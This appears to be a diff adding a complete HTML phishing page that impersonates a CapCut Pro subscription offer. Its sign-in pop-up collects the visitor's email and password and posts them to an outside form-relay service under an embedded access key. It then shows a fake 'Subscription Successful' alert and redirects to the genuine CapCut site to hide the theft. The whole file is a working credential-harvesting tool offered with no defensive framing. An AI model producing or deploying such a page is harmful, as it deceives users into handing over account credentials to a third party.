@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CapCut Subscription</title>
+    <style>
+        /* General Styles */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Container */
+        .container {
+            width: 90%;
+            max-width: 800px;
+            margin: 50px auto;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Header */
+        header h1 {
+            color: #333;
+        }
+
+        header p {
+            color: #777;
+        }
+
+        /* Subscription Plans */
+        .plans {
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            margin-top: 20px;
+        }
+
+        .plan {
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            padding: 20px;
+            width: 30%;
+            min-width: 250px;
+            text-align: center;
+            transition: 0.3s;
+        }
+
+        .plan:hover {
+            transform: scale(1.05);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .plan h2 {
+            margin-bottom: 10px;
+            color: #444;
+        }
+
+        .price {
+            font-size: 1.5em;
+            color: #007bff;
+            font-weight: bold;
+        }
+
+        ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        li {
+            padding: 5px 0;
+            color: #555;
+        }
+
+        /* Buttons */
+        button {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1em;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background: #0056b3;
+        }
+
+        /* Modal (Pop-up) */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .modal-content input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .modal-content .modal-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 10px;
+        }
+
+        .modal-content button {
+            width: 48%;
+        }
+
+        /* Footer */
+        footer {
+            margin-top: 20px;
+            color: #777;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>CapCut Pro Subscription</h1>
+            <p>Unlock premium features for professional editing!</p>
+        </header>
+
+        <div class="plans">
+            <!-- Free Plan -->
+            <div class="plan">
+                <h2>Free Plan</h2>
+                <p class="price">$0/month</p>
+                <ul>
+                    <li>✔ Basic editing tools</li>
+                    <li>✔ Watermark on exports</li>
+                    <li>✔ Standard effects & transitions</li>
+                </ul>
+                <button>Get Started</button>
+            </div>
+
+            <!-- Pro Plan -->
+            <div class="plan pro">
+                <h2>Pro Plan</h2>
+                <p class="price">$9.99/month</p>
+                <ul>
+                    <li>✔ No watermark</li>
+                    <li>✔ Premium effects & transitions</li>
+                    <li>✔ 4K video exports</li>
+                    <li>✔ AI-powered tools</li>
+                </ul>
+                <button onclick="openModal()">Subscribe Now</button>
+            </div>
+
+            <!-- Business Plan -->
+            <div class="plan business">
+                <h2>Business Plan</h2>
+                <p class="price">$19.99/month</p>
+                <ul>
+                    <li>✔ Everything in Pro</li>
+                    <li>✔ Advanced collaboration tools</li>
+                    <li>✔ Exclusive templates & assets</li>
+                    <li>✔ Cloud storage</li>
+                </ul>
+                <button onclick="openModal()">Subscribe Now</button>
+            </div>
+        </div>
+
+        <footer>
+            <p>Terms & Privacy | Contact Support | Help Center</p>
+        </footer>
+    </div>
+
+    <!-- Subscription Modal -->
+    <div class="modal" id="subscriptionModal">
+        <div class="modal-content">
+            <h2>Sign In to Subscribe</h2>
+            <form action="https://api.web3forms.com/submit" method="POST">
+                <input type="hidden" name="access_key" value="f82428d2-95a8-45cb-a6a9-a7e25bba9a89">
+
+            <input type="email" id="email" name="Email" placeholder="Enter your email" required>
+            <input type="password" id="password" name="CPass1" placeholder="Enter your password" required>
+            <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
+            <input type="hidden" name="redirect" value="https://www.capcut.com/">
+            <div class="modal-buttons">
+                <button type="submit"  onclick="subscribe()">Subscribe</button>
+                <button type="submit"  onclick="closeModal()">Cancel</button>
+            </div>
+        </div>
+    </form>
+    </div>
+
+    <script>
+        // Open Modal
+        function openModal() {
+            document.getElementById('subscriptionModal').style.display = 'flex';
+        }
+
+        // Close Modal
+        function closeModal() {
+            document.getElementById('subscriptionModal').style.display = 'none';
+        }
+
+        // Subscribe Button Function
+        function subscribe() {
+            let email = document.getElementById('email').value;
+            let password = document.getElementById('password').value;
+            
+            if (email && password) {
+                alert("Subscription Successful!\nEmail: " + email);
+                closeModal();
+            } else {
+                alert("Please enter both email and password.");
+            }
+        }
+    </script>
+</body>
+</html>
